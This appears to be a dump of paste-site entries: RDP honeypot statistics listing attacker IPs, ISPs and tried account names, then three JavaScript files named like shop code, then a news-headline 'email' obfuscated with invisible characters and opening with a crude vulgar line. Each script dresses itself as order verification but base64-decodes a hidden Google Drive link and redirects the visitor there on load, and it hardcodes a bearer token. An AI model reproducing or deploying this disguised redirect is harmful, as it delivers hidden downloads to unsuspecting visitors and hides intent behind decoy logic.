+    ""Tokyo"": 10653,
+    ""Shanghai"": 423,
+    ""South West"": 1887,
+    ""Jiangsu"": 30,
+    ""Hanoi"": 561,
+    ""Moscow"": 15,
+    ""Incheon"": 60,
+    ""California"": 237,
+    ""Karnataka"": 9,
+    ""Sofia-Capital"": 6,
+    ""Bavaria"": 9747,
+    ""Ho Chi Minh"": 48,
+    ""Nevada"": 30,
+    ""Hesse"": 6,
+    ""Kowloon City"": 6,
+    ""\u00cele-de-France"": 6,
+    ""Tatarstan Republic"": 3,
+    ""New York"": 6,
+    ""Hidalgo"": 6
+  },
+  ""country"": {
+    ""Singapore"": 159717,
+    ""Japan"": 10653,
+    ""China"": 453,
+    ""Vietnam"": 609,
+    ""Russia"": 18,
+    ""South Korea"": 60,
+    ""United States"": 273,
+    ""India"": 9,
+    ""Bulgaria"": 6,
+    ""Germany"": 9753,
+    ""Hong Kong"": 6,
+    ""France"": 6,
+    ""Mexico"": 6
+  },
+  ""account"": {
+    ""hello"": 181455,
+    ""Test"": 33,
+    ""LSpaamYmD"": 3,
+    ""jrlBAI"": 3,
+    ""DXYrwA"": 3,
+    ""Administr"": 9,
+    ""CSmFihUnv"": 3,
+    ""uenPPA"": 3,
+    ""LTYHjo"": 3,
+    ""eltons"": 15,
+    ""administr"": 15,
+    ""(empty)"": 3,
+    ""Domain"": 3,
+    ""XLOEULRFz"": 3,
+    ""wJlLfy"": 3,
+    ""WlmOwX"": 3,
+    ""DxCRuCDVx"": 3,
+    ""MCQMrW"": 3,
+    ""AebBsa"": 3
+  },
+  ""keyboard"": {
+    ""Unknown"": 181569
+  },
+  ""client_build"": {
+    ""Unknown"": 181569
+  },
+  ""client_name"": {
+    ""Unknown"": 181569
+  },
+  ""ip_type"": {
+    ""hosting & proxy"": 160374,
+    ""hosting"": 10710,
+    ""proxy"": 45,
+    ""Unknown"": 10440
+  }
+}"
+XUwwZFCk,2025-03-28_stats.json,rdp_snitch,JSON,Saturday 29th of March 2025 07:16:37 PM CDT,"{
+  ""ip"": {
+    ""156.146.57.110"": 42848,
+    ""138.199.24.6"": 91543,
+    ""150.95.89.149"": 10653,
+    ""156.146.57.52"": 10716,
+    ""156.146.57.174"": 10704,
+    ""106.14.144.233"": 423,
+    ""146.190.105.191"": 1881,
+    ""188.166.250.11"": 6,
+    ""58.218.199.219"": 30,
+    ""103.228.37.126"": 561,
+    ""185.42.12.5"": 12,
+    ""175.210.79.116"": 60,
+    ""198.235.24.64"": 9,
+    ""92.255.57.86"": 3,
+    ""157.245.104.150"": 9,
+    ""147.182.229.114"": 201,
+    ""80.94.95.90"": 6,
+    ""138.199.24.23"": 2016,
+    ""194.180.49.233"": 9747,
+    ""58.186.207.71"": 24,
+    ""198.235.24.121"": 9,
+    ""71.6.134.235"": 30,
+    ""167.94.146.62"": 3,
+    ""103.75.183.173"": 24,
+    ""88.214.25.124"": 6,
+    ""91.238.181.93"": 6,
+    ""85.215.198.96"": 3,
+    ""147.185.132.147"": 9,
+    ""178.20.129.235"": 3,
+    ""66.235.169.197"": 6,
+    ""205.210.31.75"": 9,
+    ""187.234.232.99"": 6
+  },
+  ""asn"": {
+    ""AS212238"": 64268,
+    ""AS60068"": 93559,
+    ""AS135161"": 10653,
+    ""AS37963"": 423,
+    ""AS14061"": 2097,
+    ""AS4134"": 30,
+    ""AS135918"": 561,
+    ""AS59425"": 12,
+    ""AS4766"": 60,
+    ""AS396982"": 36,
+    ""AS207566"": 3,
+    ""AS204428"": 6,
+    ""AS201814"": 9747,
+    ""AS18403"": 24,
+    ""AS10439"": 30,
+    ""AS398705"": 3,
+    ""AS151858"": 24,
+    ""AS35042"": 6,
+    ""AS49434"": 6,
+    ""AS8560"": 3,
+    ""AS24810"": 3,
+    ""AS40244"": 6,
+    ""AS8151"": 6
+  },
+  ""isp"": {
+    ""Datacamp Limited"": 64268,
+    ""DataCamp Limited"": 93559,
+    ""GMO-Z.COM PTE. LTD."": 10653,
+    ""Hangzhou Alibaba Advertising Co"": 423,
+    ""DigitalOcean, LLC"": 2097,
+    ""Chinanet"": 30,
+    ""DXT"": 561,
+    ""Chang Way Technologies Co. Limited"": 15,
+    ""Korea Telecom"": 60,
+    ""Google LLC"": 36,
+    ""SS-Net"": 6,
+    ""MEVSPACE sp. z o.o."": 9747,
+    ""FPT Telecom Company"": 24,
+    ""CariNet, Inc."": 30,
+    ""Censys, Inc."": 3,
+    ""BQT"": 24,
+    ""NOC EMAIL: noc@one-host.net"": 6,
+    ""Datacenter location PAR1 France"": 6,
+    ""IONOS SE"": 3,
+    ""Teleset LLC Nchelny Branch"": 3,
+    ""HopOne Internet Corporation"": 6,
+    ""Uninet S.A. de C.V."": 6
+  },
+  ""org"": {
+    ""Datacamp Limited"": 64268,
+    ""Cdn77 SGP"": 93559,
+    ""Zcom Thai"": 10653,
+    ""Aliyun Computing Co., LTD"": 423,
+    ""DigitalOcean, LLC"": 2091,
+    ""Digitalocean"": 6,
+    ""Chinanet JS"": 30,
+    ""DXT Digital Transformation Technology Joint Stock Company"": 561,
+    ""Horizon LLC"": 12,
+    ""Kornet"": 60,
+    ""Palo Alto Networks, Inc"": 36,
+    ""Chang Way Technologies Co. Limited"": 3,
+    ""Unmanaged LTD"": 6,
+    ""HostSlick"": 9747,
+    ""Vietnam Internet Network Information Center"": 24,
+    ""CariNet, Inc."": 30,
+    ""Censys, Inc."": 3,
+    ""Unknown"": 24,
+    ""ThinkTech Technology Industrial CO. Limited"": 12,
+    ""De Ber Ionos Cloud Txl"": 3,
+    ""Teleset LLC"": 3,
+    ""Tier.Net Technologies LLC"": 6,
+    ""UNINET"": 6
+  },
+  ""regionName"": {
+    ""North West"": 157827,
+    ""Tokyo"": 10653,
+    ""Shanghai"": 423,
+    ""South West"": 1887,
+    ""Jiangsu"": 30,
+    ""Hanoi"": 561,
+    ""Moscow"": 15,
+    ""Incheon"": 60,
+    ""California"": 237,
+    ""Karnataka"": 9,
+    ""Sofia-Capital"": 6,
+    ""Bavaria"": 9747,
+    ""Ho Chi Minh"": 48,
+    ""Nevada"": 30,
+    ""Hesse"": 6,
+    ""Kowloon City"": 6,
+    ""\u00cele-de-France"": 6,
+    ""Tatarstan Republic"": 3,
+    ""New York"": 6,
+    ""Hidalgo"": 6
+  },
+  ""country"": {
+    ""Singapore"": 159714,
+    ""Japan"": 10653,
+    ""China"": 453,
+    ""Vietnam"": 609,
+    ""Russia"": 18,
+    ""South Korea"": 60,
+    ""United States"": 273,
+    ""India"": 9,
+    ""Bulgaria"": 6,
+    ""Germany"": 9753,
+    ""Hong Kong"": 6,
+    ""France"": 6,
+    ""Mexico"": 6
+  },
+  ""account"": {
+    ""hello"": 181452,
+    ""Test"": 33,
+    ""LSpaamYmD"": 3,
+    ""jrlBAI"": 3,
+    ""DXYrwA"": 3,
+    ""Administr"": 9,
+    ""CSmFihUnv"": 3,
+    ""uenPPA"": 3,
+    ""LTYHjo"": 3,
+    ""eltons"": 15,
+    ""administr"": 15,
+    ""(empty)"": 3,
+    ""Domain"": 3,
+    ""XLOEULRFz"": 3,
+    ""wJlLfy"": 3,
+    ""WlmOwX"": 3,
+    ""DxCRuCDVx"": 3,
+    ""MCQMrW"": 3,
+    ""AebBsa"": 3
+  },
+  ""keyboard"": {
+    ""Unknown"": 181566
+  },
+  ""client_build"": {
+    ""Unknown"": 181566
+  },
+  ""client_name"": {
+    ""Unknown"": 181566
+  },
+  ""ip_type"": {
+    ""hosting & proxy"": 160371,
+    ""hosting"": 10710,
+    ""proxy"": 45,
+    ""Unknown"": 10440
+  }
+}"
+2rGdnEVR,2025-03-28_stats.json,rdp_snitch,JSON,Saturday 29th of March 2025 07:15:20 PM CDT,"{
+  ""ip"": {
+    ""156.146.57.110"": 42847,
+    ""138.199.24.6"": 91541,
+    ""150.95.89.149"": 10653,
+    ""156.146.57.52"": 10716,
+    ""156.146.57.174"": 10704,
+    ""106.14.144.233"": 423,
+    ""146.190.105.191"": 1881,
+    ""188.166.250.11"": 6,
+    ""58.218.199.219"": 30,
+    ""103.228.37.126"": 561,
+    ""185.42.12.5"": 12,
+    ""175.210.79.116"": 60,
+    ""198.235.24.64"": 9,
+    ""92.255.57.86"": 3,
+    ""157.245.104.150"": 9,
+    ""147.182.229.114"": 201,
+    ""80.94.95.90"": 6,
+    ""138.199.24.23"": 2016,
+    ""194.180.49.233"": 9747,
+    ""58.186.207.71"": 24,
+    ""198.235.24.121"": 9,
+    ""71.6.134.235"": 30,
+    ""167.94.146.62"": 3,
+    ""103.75.183.173"": 24,
+    ""88.214.25.124"": 6,
+    ""91.238.181.93"": 6,
+    ""85.215.198.96"": 3,
+    ""147.185.132.147"": 9,
+    ""178.20.129.235"": 3,
+    ""66.235.169.197"": 6,
+    ""205.210.31.75"": 9,
+    ""187.234.232.99"": 6
+  },
+  ""asn"": {
+    ""AS212238"": 64267,
+    ""AS60068"": 93557,
+    ""AS135161"": 10653,
+    ""AS37963"": 423,
+    ""AS14061"": 2097,
+    ""AS4134"": 30,
+    ""AS135918"": 561,
+    ""AS59425"": 12,
+    ""AS4766"": 60,
+    ""AS396982"": 36,
+    ""AS207566"": 3,
+    ""AS204428"": 6,
+    ""AS201814"": 9747,
+    ""AS18403"": 24,
+    ""AS10439"": 30,
+    ""AS398705"": 3,
+    ""AS151858"": 24,
+    ""AS35042"": 6,
+    ""AS49434"": 6,
+    ""AS8560"": 3,
+    ""AS24810"": 3,
+    ""AS40244"": 6,
+    ""AS8151"": 6
+  },
+  ""isp"": {
+    ""Datacamp Limited"": 64267,
+    ""DataCamp Limited"": 93557,
+    ""GMO-Z.COM PTE. LTD."": 10653,
+    ""Hangzhou Alibaba Advertising Co"": 423,
+    ""DigitalOcean, LLC"": 2097,
+    ""Chinanet"": 30,
+    ""DXT"": 561,
+    ""Chang Way Technologies Co. Limited"": 15,
+    ""Korea Telecom"": 60,
+    ""Google LLC"": 36,
+    ""SS-Net"": 6,
+    ""MEVSPACE sp. z o.o."": 9747,
+    ""FPT Telecom Company"": 24,
+    ""CariNet, Inc."": 30,
+    ""Censys, Inc."": 3,
+    ""BQT"": 24,
+    ""NOC EMAIL: noc@one-host.net"": 6,
+    ""Datacenter location PAR1 France"": 6,
+    ""IONOS SE"": 3,
+    ""Teleset LLC Nchelny Branch"": 3,
+    ""HopOne Internet Corporation"": 6,
+    ""Uninet S.A. de C.V."": 6
+  },
+  ""org"": {
+    ""Datacamp Limited"": 64267,
+    ""Cdn77 SGP"": 93557,
+    ""Zcom Thai"": 10653,
+    ""Aliyun Computing Co., LTD"": 423,
+    ""DigitalOcean, LLC"": 2091,
+    ""Digitalocean"": 6,
+    ""Chinanet JS"": 30,
+    ""DXT Digital Transformation Technology Joint Stock Company"": 561,
+    ""Horizon LLC"": 12,
+    ""Kornet"": 60,
+    ""Palo Alto Networks, Inc"": 36,
+    ""Chang Way Technologies Co. Limited"": 3,
+    ""Unmanaged LTD"": 6,
+    ""HostSlick"": 9747,
+    ""Vietnam Internet Network Information Center"": 24,
+    ""CariNet, Inc."": 30,
+    ""Censys, Inc."": 3,
+    ""Unknown"": 24,
+    ""ThinkTech Technology Industrial CO. Limited"": 12,
+    ""De Ber Ionos Cloud Txl"": 3,
+    ""Teleset LLC"": 3,
+    ""Tier.Net Technologies LLC"": 6,
+    ""UNINET"": 6
+  },
+  ""regionName"": {
+    ""North West"": 157824,
+    ""Tokyo"": 10653,
+    ""Shanghai"": 423,
+    ""South West"": 1887,
+    ""Jiangsu"": 30,
+    ""Hanoi"": 561,
+    ""Moscow"": 15,
+    ""Incheon"": 60,
+    ""California"": 237,
+    ""Karnataka"": 9,
+    ""Sofia-Capital"": 6,
+    ""Bavaria"": 9747,
+    ""Ho Chi Minh"": 48,
+    ""Nevada"": 30,
+    ""Hesse"": 6,
+    ""Kowloon City"": 6,
+    ""\u00cele-de-France"": 6,
+    ""Tatarstan Republic"": 3,
+    ""New York"": 6,
+    ""Hidalgo"": 6
+  },
+  ""country"": {
+    ""Singapore"": 159711,
+    ""Japan"": 10653,
+    ""China"": 453,
+    ""Vietnam"": 609,
+    ""Russia"": 18,
+    ""South Korea"": 60,
+    ""United States"": 273,
+    ""India"": 9,
+    ""Bulgaria"": 6,
+    ""Germany"": 9753,
+    ""Hong Kong"": 6,
+    ""France"": 6,
+    ""Mexico"": 6
+  },
+  ""account"": {
+    ""hello"": 181449,
+    ""Test"": 33,
+    ""LSpaamYmD"": 3,
+    ""jrlBAI"": 3,
+    ""DXYrwA"": 3,
+    ""Administr"": 9,
+    ""CSmFihUnv"": 3,
+    ""uenPPA"": 3,
+    ""LTYHjo"": 3,
+    ""eltons"": 15,
+    ""administr"": 15,
+    ""(empty)"": 3,
+    ""Domain"": 3,
+    ""XLOEULRFz"": 3,
+    ""wJlLfy"": 3,
+    ""WlmOwX"": 3,
+    ""DxCRuCDVx"": 3,
+    ""MCQMrW"": 3,
+    ""AebBsa"": 3
+  },
+  ""keyboard"": {
+    ""Unknown"": 181563
+  },
+  ""client_build"": {
+    ""Unknown"": 181563
+  },
+  ""client_name"": {
+    ""Unknown"": 181563
+  },
+  ""ip_type"": {
+    ""hosting & proxy"": 160368,
+    ""hosting"": 10710,
+    ""proxy"": 45,
+    ""Unknown"": 10440
+  }
+}"
+mLWvej8X,Products.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 07:05:16 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/089/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+mvbUp2NB,Order.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 06:49:53 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/294/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+GwqDh60u,Market.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 06:34:31 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/302/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+uTYEwxLW,News March29 25,Newscaster_Ned,Email,Saturday 29th of March 2025 06:26:32 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎
+
+H‎i‎e‎ ‎g‎i‎e‎z‎,‎ ‎N‎o‎o‎z‎e‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎ ‎h‎e‎r‎e‎ ‎g‎o‎n‎n‎a‎ ‎s‎h‎o‎v‎e‎ ‎d‎r‎a‎d‎l‎e‎s‎ ‎u‎p‎ ‎j‎0‎0‎z‎ ‎m‎o‎n‎k‎e‎h‎ ‎b‎u‎t‎t‎s‎.‎
+
+D‎O‎G‎E‎ ‎E‎x‎e‎c‎u‎t‎e‎s‎ ‎M‎a‎s‎s‎ ‎F‎i‎r‎i‎n‎g‎s‎ ‎a‎t‎ ‎U‎.‎S‎.‎ ‎I‎n‎s‎t‎i‎t‎u‎t‎e‎ ‎o‎f‎ ‎P‎e‎a‎c‎e‎
+I‎s‎s‎a‎:‎ ‎B‎i‎l‎l‎ ‎t‎o‎ ‎R‎e‎i‎n‎ ‎i‎n‎ ‎D‎i‎s‎t‎r‎i‎c‎t‎ ‎J‎u‎d‎g‎e‎s‎ ‎I‎n‎j‎u‎n‎c‎t‎i‎o‎n‎ ‎A‎b‎i‎l‎i‎t‎y‎ ‎i‎s‎ ‎'‎A‎ ‎F‎i‎r‎s‎t‎ ‎S‎t‎e‎p‎'‎
+D‎i‎s‎a‎b‎l‎e‎d‎ ‎A‎i‎r‎ ‎F‎o‎r‎c‎e‎ ‎V‎e‎t‎e‎r‎a‎n‎ ‎R‎e‎c‎e‎i‎v‎e‎s‎ ‎C‎u‎s‎t‎o‎m‎-‎B‎u‎i‎l‎t‎ ‎H‎o‎m‎e‎
+'‎F‎i‎n‎g‎e‎r‎p‎r‎i‎n‎t‎s‎'‎ ‎S‎i‎n‎g‎e‎r‎ ‎J‎o‎n‎ ‎K‎a‎h‎n‎ ‎E‎x‎p‎o‎s‎e‎s‎ ‎L‎e‎f‎t‎'‎s‎ ‎A‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎T‎o‎x‎i‎f‎y‎ ‎R‎e‎l‎i‎g‎i‎o‎n‎
+N‎Y‎C‎ ‎W‎o‎m‎a‎n‎ ‎W‎h‎o‎ ‎C‎h‎a‎s‎e‎d‎ ‎M‎A‎G‎A‎ ‎H‎a‎t‎-‎W‎e‎a‎r‎e‎r‎ ‎i‎n‎ ‎S‎u‎b‎w‎a‎y‎ ‎I‎s‎ ‎a‎ ‎L‎u‎x‎u‎r‎y‎ ‎B‎r‎a‎n‎d‎ ‎S‎p‎e‎c‎i‎a‎l‎i‎s‎t‎
+T‎e‎s‎l‎a‎ ‎T‎a‎k‎e‎d‎o‎w‎n‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎a‎ ‎B‎u‎s‎t‎ ‎i‎n‎ ‎T‎e‎x‎a‎s‎ ‎2‎n‎d‎ ‎L‎a‎r‎g‎e‎s‎t‎ ‎C‎i‎t‎y‎
+C‎o‎y‎o‎t‎e‎s‎ ‎A‎r‎e‎ ‎S‎m‎u‎g‎g‎l‎i‎n‎g‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎O‎u‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎
+D‎i‎s‎g‎r‎a‎c‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎C‎o‎r‎r‎e‎s‎p‎o‎n‎d‎e‎n‎t‎s‎ ‎A‎s‎s‎n‎.‎ ‎D‎u‎m‎p‎s‎ ‎T‎r‎u‎m‎p‎-‎h‎a‎t‎i‎n‎g‎ ‎C‎o‎m‎e‎d‎i‎a‎n‎
+M‎e‎t‎a‎ ‎C‎o‎n‎t‎i‎n‎u‎e‎s‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎N‎o‎t‎e‎s‎ ‎R‎o‎l‎l‎o‎u‎t‎ ‎a‎s‎ ‎S‎o‎m‎e‎ ‎V‎e‎n‎t‎ ‎O‎v‎e‎r‎ ‎F‎a‎c‎t‎ ‎C‎h‎e‎c‎k‎i‎n‎g‎
+G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
+H‎o‎m‎e‎P‎a‎g‎e‎
+W‎i‎n‎n‎i‎n‎g‎!‎
+
+E‎g‎g‎ ‎P‎r‎i‎c‎e‎s‎ ‎T‎a‎k‎e‎ ‎S‎h‎a‎r‎p‎ ‎P‎l‎u‎n‎g‎e‎ ‎a‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎W‎a‎t‎c‎h‎ ‎C‎o‎s‎t‎s‎ ‎T‎r‎e‎n‎d‎ ‎D‎o‎w‎n‎w‎a‎r‎d‎
+e‎a‎t‎i‎n‎g‎ ‎e‎g‎g‎s‎
+T‎h‎e‎ ‎p‎r‎i‎c‎e‎ ‎o‎f‎ ‎e‎g‎g‎s‎ ‎h‎a‎s‎ ‎t‎a‎k‎e‎n‎ ‎a‎ ‎s‎h‎a‎r‎p‎ ‎p‎l‎u‎n‎g‎e‎ ‎a‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎h‎a‎v‎e‎ ‎w‎a‎t‎c‎h‎e‎d‎ ‎t‎h‎e‎ ‎c‎o‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎g‎r‎o‎c‎e‎r‎y‎ ‎s‎t‎a‎p‎l‎e‎ ‎s‎h‎i‎f‎t‎ ‎d‎o‎w‎n‎w‎a‎r‎d‎ ‎s‎i‎n‎c‎e‎ ‎m‎i‎d‎-‎F‎e‎b‎r‎u‎a‎r‎y‎,‎ ‎p‎e‎r‎ ‎a‎ ‎r‎e‎p‎o‎r‎t‎.‎
+
+V‎I‎D‎E‎O‎ ‎—‎ ‎T‎r‎a‎g‎i‎c‎ ‎L‎o‎s‎s‎:‎ ‎F‎o‎u‎r‎ ‎T‎e‎x‎a‎s‎ ‎D‎e‎p‎u‎t‎i‎e‎s‎ ‎i‎n‎ ‎H‎a‎r‎r‎i‎s‎ ‎C‎o‎u‎n‎t‎y‎ ‎D‎i‎e‎ ‎b‎y‎ ‎A‎p‎p‎a‎r‎e‎n‎t‎ ‎S‎u‎i‎c‎i‎d‎e‎ ‎W‎e‎e‎k‎s‎ ‎A‎p‎a‎r‎t‎
+V‎I‎D‎E‎O‎:‎ ‎4‎ ‎T‎X‎ ‎D‎e‎p‎u‎t‎i‎e‎s‎ ‎i‎n‎ ‎H‎a‎r‎r‎i‎s‎ ‎C‎o‎u‎n‎t‎y‎ ‎D‎i‎e‎ ‎b‎y‎ ‎A‎p‎p‎a‎r‎e‎n‎t‎ ‎S‎u‎i‎c‎i‎d‎e‎ ‎W‎e‎e‎k‎s‎ ‎A‎p‎a‎r‎t‎
+8‎6‎
+U‎k‎r‎a‎i‎n‎i‎a‎n‎s‎ ‎P‎r‎e‎d‎i‎c‎t‎ ‎R‎u‎s‎s‎i‎a‎ ‎I‎s‎ ‎P‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎f‎o‎r‎ ‎S‎p‎r‎i‎n‎g‎ ‎O‎f‎f‎e‎n‎s‎i‎v‎e‎ ‎A‎m‎i‎d‎ ‎C‎e‎a‎s‎e‎f‎i‎r‎e‎ ‎T‎a‎l‎k‎s‎
+U‎k‎r‎a‎i‎n‎i‎a‎n‎s‎ ‎P‎r‎e‎d‎i‎c‎t‎ ‎R‎u‎s‎s‎i‎a‎ ‎P‎r‎e‎p‎a‎r‎i‎n‎g‎ ‎f‎o‎r‎ ‎S‎p‎r‎i‎n‎g‎ ‎O‎f‎f‎e‎n‎s‎i‎v‎e‎
+1‎,‎8‎0‎0‎
+C‎o‎n‎v‎i‎c‎t‎e‎d‎ ‎M‎u‎r‎d‎e‎r‎e‎r‎ ‎C‎a‎u‎g‎h‎t‎ ‎S‎n‎e‎a‎k‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎T‎e‎x‎a‎s‎ ‎o‎n‎ ‎T‎r‎a‎i‎n‎ ‎f‎r‎o‎m‎ ‎M‎e‎x‎i‎c‎o‎
+C‎o‎n‎v‎i‎c‎t‎e‎d‎ ‎M‎u‎r‎d‎e‎r‎e‎r‎ ‎C‎a‎u‎g‎h‎t‎ ‎S‎n‎e‎a‎k‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎T‎e‎x‎a‎s‎ ‎o‎n‎ ‎T‎r‎a‎i‎n‎ ‎f‎r‎o‎m‎ ‎M‎e‎x‎i‎c‎o‎
+8‎0‎
+J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎P‎a‎r‎t‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎D‎E‎I‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎,‎ ‎C‎a‎l‎l‎s‎ ‎I‎t‎ ‎a‎ ‎‘‎C‎o‎e‎r‎c‎i‎v‎e‎ ‎T‎h‎r‎e‎a‎t‎’‎
+'‎C‎o‎e‎r‎c‎i‎v‎e‎ ‎T‎h‎r‎e‎a‎t‎'‎:‎ ‎J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎P‎a‎r‎t‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎D‎E‎I‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎
+3‎,‎2‎6‎7‎
+D‎.‎C‎.‎ ‎C‎a‎r‎d‎i‎n‎a‎l‎ ‎S‎l‎a‎m‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎M‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎R‎e‎f‎o‎r‎m‎s‎ ‎a‎s‎ ‎‘‎C‎r‎u‎s‎a‎d‎e‎’‎
+D‎.‎C‎.‎ ‎C‎a‎r‎d‎i‎n‎a‎l‎ ‎S‎l‎a‎m‎s‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎M‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎R‎e‎f‎o‎r‎m‎s‎ ‎a‎s‎ ‎'‎C‎r‎u‎s‎a‎d‎e‎'‎
+5‎,‎4‎2‎6‎
+U‎.‎S‎.‎ ‎T‎r‎o‎o‎p‎s‎ ‎i‎n‎ ‎G‎r‎e‎e‎n‎l‎a‎n‎d‎ ‎G‎r‎e‎e‎t‎ ‎V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎D‎ ‎V‎a‎n‎c‎e‎ ‎w‎i‎t‎h‎ ‎C‎h‎a‎n‎t‎s‎ ‎o‎f‎ ‎‘‎U‎S‎A‎!‎ ‎U‎S‎A‎!‎ ‎U‎S‎A‎!‎’‎
+U‎.‎S‎.‎ ‎T‎r‎o‎o‎p‎s‎ ‎i‎n‎ ‎G‎r‎e‎e‎n‎l‎a‎n‎d‎ ‎G‎r‎e‎e‎t‎ ‎V‎P‎ ‎J‎D‎ ‎V‎a‎n‎c‎e‎ ‎w‎i‎t‎h‎ ‎C‎h‎a‎n‎t‎s‎ ‎o‎f‎ ‎'‎U‎S‎A‎!‎ ‎U‎S‎A‎!‎ ‎U‎S‎A‎!‎'‎
+2‎,‎8‎7‎6‎
